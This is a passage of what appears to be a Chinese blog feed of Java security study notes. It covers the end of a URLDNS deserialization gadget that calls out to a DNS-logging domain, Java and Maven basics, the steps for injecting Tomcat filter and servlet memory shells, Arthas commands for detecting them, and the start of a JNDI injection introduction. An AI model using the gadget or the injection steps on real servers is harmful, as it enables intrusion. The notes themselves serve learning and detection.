class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://123.1020fd40.ipv6.1433.eu.org&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射修改私有属性hashCode为-1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> u.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(u, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hm.put(u, url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503001328190.png" alt="image-20230503001328190"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java泛型</title>
      <link href="/2023/05/01/JAVA%E5%9F%BA%E6%9C%AC%E4%BA%86%E8%A7%A3/"/>
      <url>/2023/05/01/JAVA%E5%9F%BA%E6%9C%AC%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA基本了解"><a href="#JAVA基本了解" class="headerlink" title="JAVA基本了解"></a>JAVA基本了解</h1><p><a href="https://blog.csdn.net/MinggeQingchun/article/details/120578602">(71条消息) Java–Java版本和JDK版本_java版本和jdk版本区别_MinggeQingchun的博客-CSDN博客</a></p><p>![image-20230501122332032](E:\typora img\image-20230501122332032.png)</p><p>JDK8u311 → JAVA8</p><h3 id="java名词"><a href="#java名词" class="headerlink" title="java名词"></a>java名词</h3><p>Java是将代码编译成一种“字节码”，它类似于抽象的CPU指令，然后，针对不同平台编写虚拟机，不同平台的虚拟机负责加载字节码并执行，这样就实现了“一次编写，到处运行”的效果。</p><p>![image-20230425225221871](E:\typora img\image-20230425225221871.png)</p><p>![image-20230425225139403](E:\typora img\image-20230425225139403.png)</p><p>![image-20230425225121609](E:\typora img\image-20230425225121609.png)</p><p>jar包实际上就是一个zip格式的压缩文件</p><h3 id="运行java程序"><a href="#运行java程序" class="headerlink" title="运行java程序"></a>运行java程序</h3><p>![image-20230425225313657](E:\typora img\image-20230425225313657.png)</p><p>一个Java源码只能定义一个<code>public</code>类型的class，并且class名称和文件名要完全一致；</p><p>注意：</p><p>我们通常说的Java 8，Java 11，Java 17，是指JDK的版本，也就是JVM的版本</p><p>而每个版本的JVM，它能执行的class文件版本也不同。例如，Java 11对应的class文件版本是55，而Java 17对应的class文件版本是61。</p><p><strong>高版本的JDK可编译输出低版本兼容的class文件</strong>，但需注意，低版本的JDK可能不存在高版本JDK添加的类和方法，导致运行时报错。</p><p>运行时使用哪个JDK版本，编译时就尽量使用同一版本编译源码。</p><h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>![image-20230425225605486](E:\typora img\image-20230425225605486.png)</p><p>![image-20230425225757719](E:\typora img\image-20230425225757719.png)</p><p>定义private字段和pubilc方法来操作private字段</p><blockquote><p>虽然外部代码不能直接修改<code>private</code>字段，但是，外部代码可以调用方法<code>setName()</code>和<code>setAge()</code>来间接修改<code>private</code>字段。在方法内部，我们就有机会检查参数对不对。比如，<code>setAge()</code>就会检查传入的参数，参数超出了范围，直接报错。这样，外部代码就没有任何机会把<code>age</code>设置成不合理的值。</p></blockquote><p>定义private方法</p><blockquote><p><code>private</code>方法，外部代码无法调用，但是，内部方法可以调用它。</p><p>方法可以封装一个类的对外接口，调用方不需要知道也不关心字段是否存在</p></blockquote><h4 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h4><blockquote><p>JavaBean是一种符合命名规范的<code>class</code>，它通过<code>getter</code>和<code>setter</code>来定义属性；</p></blockquote><p>例子</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>![image-20230425233400613](E:\typora img\image-20230425233400613.png)</p><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><blockquote><p>如果一个<code>class</code>定义了方法，但没有具体执行代码，这个方法就是抽象方法，抽象方法用<code>abstract</code>修饰。</p><p>因为无法执行抽象方法，因此这个类也必须申明为抽象类（abstract class）。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>使用<code>abstract</code>修饰的类就是抽象类。我们无法实例化一个抽象类：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(); <span class="comment">// 编译错误</span></span><br></pre></td></tr></table></figure><blockquote><p>无法实例化的抽象类有什么用？</p><p>因为抽象类本身被设计成只能用于被继承，因此，抽象类可以强迫子类实现其定义的抽象方法，否则编译会报错。因此，抽象方法实际上相当于定义了“规范”：即规定高层类的接口，从而保证所有子类都有相同的接口实现，这样，多态就能发挥出威力。</p></blockquote><h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><blockquote><p>如果一个抽象类没有字段，所有方法全部都是抽象方法，就可以把该抽象类改写为接口：<code>interface</code>。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个具体的<code>class</code>去实现一个<code>interface</code>时，需要使用<code>implements</code>关键字。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口的继承</p><p>![image-20230425233728359](E:\typora img\image-20230425233728359.png)</p><h4 id="静态字段和静态方法"><a href="#静态字段和静态方法" class="headerlink" title="静态字段和静态方法"></a>静态字段和静态方法</h4><blockquote><p>修饰符static</p><p>静态方法和静态字段属于<code>class</code>而不属于实例</p></blockquote><p>![image-20230425234023210](E:\typora img\image-20230425234023210.png)</p><p>使用类名来访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person.setNumber(<span class="number">99</span>);</span><br><span class="line">System.out.println(Person.number);</span><br></pre></td></tr></table></figure><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><blockquote><p>一个包就是一个命名空间</p><p>真正的完整类名是<code>包名.类名</code></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> xxx; <span class="comment">// 申明包名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packge_name.class_name; <span class="comment">// 导入其他包中的类</span></span><br></pre></td></tr></table></figure><h4 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h4><p><img src="/../blog/source/images/java.lang.png" alt="img"></p><h5 id="String对象"><a href="#String对象" class="headerlink" title="String对象"></a>String对象</h5><blockquote><p>Java中的String是不可变的，因为String类的存储是通过final修饰的char[]数组来存放结果的，不可更改。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        System.out.println(s.hashCode());</span><br><span class="line">        System.out.println(s.toUpperCase().hashCode());</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![image-20230428115645212](E:\typora img\image-20230428115645212.png)</p><h5 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h5><p>内存数据与外存数据，使用字节流或字符流</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// getInputStream()获得结果</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        <span class="comment">// 用来缓存命令执行结果数据</span></span><br><span class="line">        <span class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">readLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// read方法将数据读取到cache字节数组中，如果返回-1说明到了结尾，数据读取完毕</span></span><br><span class="line">        <span class="keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">// 数据读取完毕后，write方法将cache数组中从0到readlen的数据写入输出流中</span></span><br><span class="line">            byteArrayOutputStream.write(cache, <span class="number">0</span>, readLen);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(byteArrayOutputStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p><a href="https://cloud.tencent.com/developer/article/1887019">IDEA中的debug断点调试技巧，学会真的香！ - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">(72条消息) IntelliJ IDEA创建Servlet最新方法 Idea版本2020.2.2以及IntelliJ IDEA创建Servlet 404问题（超详细）_idea创建servlet项目_Granger_g的博客-CSDN博客</a></p><h2 id="ysoserial-调试"><a href="#ysoserial-调试" class="headerlink" title="ysoserial 调试"></a>ysoserial 调试</h2><p>下载源码，等待maven导入依赖，再配置如下即可（java版本为java8）</p><p>![image-20230502220543589](E:\typora img\image-20230502220543589.png)</p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><blockquote><p>Maven是一个Java项目管理和构建工具，它可以定义项目结构、项目依赖，并使用统一的方式进行自动化构建，是Java项目不可缺少的工具。</p></blockquote><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><h3 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h3><p>![image-20230426102535777](E:\typora img\image-20230426102535777.png)</p><h3 id="模块化管理"><a href="#模块化管理" class="headerlink" title="模块化管理"></a>模块化管理</h3><p>把一个项目分成多个模块</p><p>![image-20230426102935510](E:\typora img\image-20230426102935510.png)</p><p>Maven的中央仓库，存储各种模块，例如，我们使用commons logging、log4j这些第三方模块，就是第三方模块的开发者自己把编译好的jar包发布到Maven的中央仓库中。</p><h2 id="更换中央仓库源"><a href="#更换中央仓库源" class="headerlink" title="更换中央仓库源"></a>更换中央仓库源</h2><p>修改 maven 根目录下的 conf 文件夹中的 settings.xml 文件，在 mirrors 节点上，添加内容如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p><a href="https://www.runoob.com/maven/maven-plugins.html">https://www.runoob.com/maven/maven-plugins.html</a></p><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><p><a href="https://www.runoob.com/maven/maven-pom.html">https://www.runoob.com/maven/maven-pom.html</a></p><p>包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。</p><p>引入外部依赖</p><blockquote><p>要添加依赖项，我们一般是先在 src 文件夹下添加 lib 文件夹，然后将你工程需要的 jar 文件复制到 lib 文件夹下。</p></blockquote><h3 id="注册依赖"><a href="#注册依赖" class="headerlink" title="注册依赖"></a>注册依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在这里添加你的依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  <span class="comment">&lt;!-- 库名称，也可以自定义 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--库名称，也可以自定义--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!--版本号--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span> <span class="comment">&lt;!--作用域--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;basedir&#125;\src\lib\ldapjdk.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span> <span class="comment">&lt;!--项目根目录下的lib文件夹下--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>![image-20230426105518262](E:\typora img\image-20230426105518262.png)</p><h2 id="与Gradle的区别"><a href="#与Gradle的区别" class="headerlink" title="与Gradle的区别"></a>与Gradle的区别</h2><p><a href="https://www.runoob.com/maven/maven-plugins.html">https://www.runoob.com/maven/maven-plugins.html</a></p><h1 id="JAVA-Agent"><a href="#JAVA-Agent" class="headerlink" title="JAVA Agent"></a>JAVA Agent</h1><h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><p><a href="https://www.anquanke.com/post/id/279160#h3-1">内存马探究-安全客 - 安全资讯平台</a></p><p><a href="https://trrqsec.github.io/2022/04/10/Java%E5%AE%89%E5%85%A8-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">Java安全-Tomcat内存马学习-信息安全博客</a></p><p><a href="http://wjlshare.com/archives/1529">Tomcat 内存马学习(一)：Filter型 – 天下大木头</a></p><p><a href="https://www.freebuf.com/articles/web/343105.html">Tomcat Filter 型内存马流程理解与手写 EXP - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/whgk/p/6399262.html">Java Web(一) Servlet详解！！ - 有梦想的老王 - 博客园</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>![在这里插入图片描述](E:\typora img\201909251250360.png)</p><blockquote><p>客户端发起一个http请求，比如get类型。</p><p>Tomcat 作为Servlet容器,将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；</p><p>Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。<br>Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。<br>Servlet容器调用service()方法。<br>service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。<br>doXXX方法中是我们自己写的业务逻辑。</p><p>业务逻辑处理完成之后，返回给Servlet容器，Servlet容器会将响应的信息封装为HttpServletResponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器，然后容器将结果返回给客户端。</p><p>容器关闭时候，会调用destory方法</p></blockquote><p>Tomcat的配置</p><p>![img](E:\typora img\v2-c3adc47d4c42dae472308ca19eb84374_720w.webp)</p><ul><li>Server 元素表示整个 Catalina servlet 容器。</li><li>Service元素表示一个或多个连接器组件的组合，这些组件共享一个用于处理传入请求的引擎组件。Server 中可以有多个 Service。</li><li>Executor表示可以在Tomcat中的组件之间共享的线程池。</li><li>Connector代表连接组件。Tomcat 支持三种协议：HTTP&#x2F;1.1、HTTP&#x2F;2.0、AJP。</li><li>Context元素表示一个Web应用程序，它在特定的虚拟主机中运行。每个Web应用程序都基于Web应用程序存档（WAR）文件，或者包含相应的解包内容的相应目录，如Servlet规范述。</li><li>Engine元素表示与特定的Catalina服务相关联的整个请求处理机器。它接收并处理来自一个或多个连接器的所有请求，并将完成的响应返回给连接器，以便最终传输回客户端。</li><li>Host元素表示一个虚拟主机，它是一个服务器的网络名称（如“<a href="http://www.mycompany.com”)与运行tomcat的特定服务器的关联./">www.mycompany.com”）与运行Tomcat的特定服务器的关联。</a></li></ul><p>![img](E:\typora img\1622447564_60b495cc4ddf6ab5c7b98.png!small)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Engine，实现类为 org.apache.catalina.core.StandardEngine</span><br><span class="line">Host，实现类为 org.apache.catalina.core.StandardHost</span><br><span class="line">Context，实现类为 org.apache.catalina.core.StandardContext</span><br><span class="line">Wrapper，实现类为 org.apache.catalina.core.StandardWrapper</span><br></pre></td></tr></table></figure><p>Tomcat启动加载的顺序：Listener -&gt; Filter -&gt; Servlet</p><h2 id="传统web应用型"><a href="#传统web应用型" class="headerlink" title="传统web应用型"></a>传统web应用型</h2><h3 id="listener类型"><a href="#listener类型" class="headerlink" title="listener类型"></a>listener类型</h3><p>最终实例化出来的监听器被存储在 <code>applicationEventListenersList</code> 属性中</p><p>所以内存马构造中需要获取到 StandardContext 类，然后获取其applicationEventListenersList 属性，最后注入我们构造的恶意监听器到 applicationEventListenersList 属性里</p><h3 id="filter类型"><a href="#filter类型" class="headerlink" title="filter类型"></a>filter类型</h3><p><a href="http://wjlshare.com/archives/1529">Tomcat 内存马学习(一)：Filter型 – 天下大木头</a></p><p><strong>动态注册恶意 Filter，并且将其放到 <code>filterChain </code>的最前面</strong></p><h4 id="filter过滤器工作原理"><a href="#filter过滤器工作原理" class="headerlink" title="filter过滤器工作原理"></a>filter过滤器工作原理</h4><p>![image-20210331212905616](E:\typora img\image-20210331212905616.png)</p><ol><li>根据请求的 URL 从 <code>FilterMaps</code> 中遍历<code>FilterMap</code>找出与之 URL 对应的 Filter 名称</li><li>根据 Filter 名称去 <code>FilterConfigs</code> 中寻找对应名称的 <code>FilterConfig</code></li><li>找到对应的 <code>FilterConfig</code> 之后添加到<code> FilterChain</code>中，并且返回 <code>FilterChain</code></li><li><code>filterChain </code>中调用 <code>internalDoFilter</code> 遍历获取 chain 中的 <code>FilterConfig </code>，然后从<code> FilterConfig</code> 中获取 Filter，然后调用 Filter 的 doFilter 方法</li></ol><blockquote><p>关键点在于<code>FilterMap</code>和<code>FilterConfig</code>，如果我们可以控制这两个变量，我们就可以任意注册filter。</p><p>他们存储在<code>StandardContext</code>的属性<code>FilterMaps</code>和<code>FilterConfigs</code>中，而<code>StandardContext</code>是可以获得的，<code>filterconfig</code>中需要添加的<code>filterdef</code>也是我们可控的，综上filter动态添加过程是我们可操控的。</p></blockquote><p>![image-20230424230657970](E:\typora img\image-20230424230657970.png)</p><ul><li><p><code>filterConfigs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</span><br></pre></td></tr></table></figure></li><li><p><code>filterDefs</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</span><br></pre></td></tr></table></figure></li><li><p><code>filterMaps</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</span><br></pre></td></tr></table></figure></li></ul><p>思路：</p><ol><li>创建一个恶意 Filter</li><li>利用 FilterDef 对 Filter 进行一个封装</li><li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li><li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li></ol><img src="E:\typora img\image-20230424231859397.png" alt="image-20230424231859397" style="zoom: 150%;" /><h3 id="servlet类型"><a href="#servlet类型" class="headerlink" title="servlet类型"></a>servlet类型</h3><p>工作流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">装载：启动服务器时加载Servlet的实例</span><br><span class="line"></span><br><span class="line">初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成</span><br><span class="line"></span><br><span class="line">调用：即每次调用Servlet的service()，从第一次到以后的多次访问，都是只是调用doGet()或doPost()方法（doGet、doPost内部实现，具体参照HttpServlet类service()的重写）</span><br><span class="line"></span><br><span class="line">销毁：停止服务器时调用destroy()方法，销毁实例</span><br></pre></td></tr></table></figure><p>Servlet需要重写doGet和doPost</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 通过 context.createWapper() 创建 Wapper 对象；</span><br><span class="line"></span><br><span class="line">2. 设置 Servlet 的 LoadOnStartUp 的值；（优先级）</span><br><span class="line"></span><br><span class="line">3. 设置 Servlet 的 Name；</span><br><span class="line"></span><br><span class="line">4. 设置 Servlet 对应的 Class；</span><br><span class="line"></span><br><span class="line">5. 将 Servlet 添加到 context 的 children 中；</span><br><span class="line"></span><br><span class="line">6. 将 url 路径和 servlet 类做映射。</span><br></pre></td></tr></table></figure><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>阿里巴巴的Java诊断工具–阿尔萨斯</p><p>注意启动用的java版本要和启动tomcat的java版本一致，用户一致。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">servelt</span></span><br><span class="line">mbean | grep &quot;name=/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">filter</span></span><br><span class="line">sc *.Filter # 模糊搜索，列出所有调用了 Filter 的类</span><br><span class="line">sc -d org.apache.coyote.module.SimpleSerializers # classloader</span><br><span class="line"></span><br><span class="line">classloader # 查看类加载器加载了哪些类</span><br><span class="line"></span><br><span class="line">jad --source-only org.apache.jsp.evil_jsp # 反编译类</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">终极排查 heapdump</span></span><br><span class="line">heapdump</span><br><span class="line">strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &quot;POST /&quot;</span><br></pre></td></tr></table></figure><p>![image-20230503204528006](E:\typora img\image-20230503204528006.png)</p><p>![image-20230426163320217](E:\typora img\image-20230426163320217.png)</p><p>动态注册，对比<code>web.xml</code>中的配置</p><h1 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h1><p><a href="https://blog.csdn.net/qq_22076345/article/details/82392236">(69条消息) Intellij idea 报错：Error : java 不支持发行版本5_idea错误不支持发行版本5_灵颖桥人的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2023/05/01/JNDI/"/>
      <url>/2023/05/01/JNDI/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI"></a>什么是JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是<code>Java</code>提供的<code>Java</code>命名和目录接口。</p><blockquote><p>Naming Service 命名服务：命名服务将名称和对象进行关联，提供通过名称找到对象的操作</p><p>Directory Service目录服务：目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。</p></blockquote><p>通过调用<code>JNDI</code>的<code>API</code>可以定位资源和其他程序对象。</p><blockquote><p>通过名称查找(<code>lookup</code>)对象 </p><p>通过对象的属性搜索(<code>search</code>)对象</p></blockquote><p><code>JNDI</code>是<code>Java EE</code>的重要部分，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dns:<span class="comment">//domain</span></span><br><span class="line">ldap:<span class="comment">//ip/name</span></span><br><span class="line">rmi:<span class="comment">//ip/name</span></span><br></pre></td></tr></table></figure><h2 id="什么是RMI"><a href="#什么是RMI" class="headerlink" title="什么是RMI"></a>什么是RMI</h2><p><code>RMI</code>全称是<code>Remote Method Invocation</code>（远程⽅法调⽤），目的是为了让两个隔离的java虚拟机，如虚拟机A能够调用到虚拟机B中的对象，而且这些虚拟机可以不存在于同一台主机上。</p><p><strong>RMI其发送、接收的数据都是反序列化数据。</strong></p><h2 id="什么是LDAP"><a href="#什么是LDAP" class="headerlink" title="什么是LDAP"></a>什么是LDAP</h2><p> <code>LDAP</code>，全称为 <code>Lightweight Directory Access Protocol</code>，即轻量级目录访问协议，主要用于资源查询。</p><h2 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" 